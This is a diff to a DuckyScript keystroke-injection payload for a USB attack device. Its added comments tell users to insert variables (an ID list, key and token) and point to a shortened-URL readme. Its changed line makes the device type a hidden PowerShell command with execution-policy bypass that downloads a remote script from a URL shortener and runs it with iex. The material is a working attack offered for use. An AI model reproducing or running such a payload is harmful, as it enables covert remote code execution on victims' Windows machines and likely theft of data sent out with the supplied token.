@@ -17,6 +17,11 @@ REM                 "Y88P"           888
 REM ______________________________________________________________________________________________
 REM
 REM
+REM You just need to put your variables into this txt script. 
+REM
+REM If you don't know how to get those, make sure you check the readme.md file at this link : https://shorturl.at/kuOR6
+REM
+REM ______________________________________________________________________________________________
 DELAY 2000
 GUI r
 DELAY 1000
@@ -50,5 +55,5 @@ ENTER
 DELAY 600
 GUI r
 DELAY 1000
-STRING powershell -w h -NoP -Ep Bypass ;irm https://shorturl.at/gpvF5 | iex | iex
+STRING powershell -w h -NoP -Ep Bypass $idList='';$key='';$token='';irm https://shorturl.at/gpvF5 | iex
 ENTER
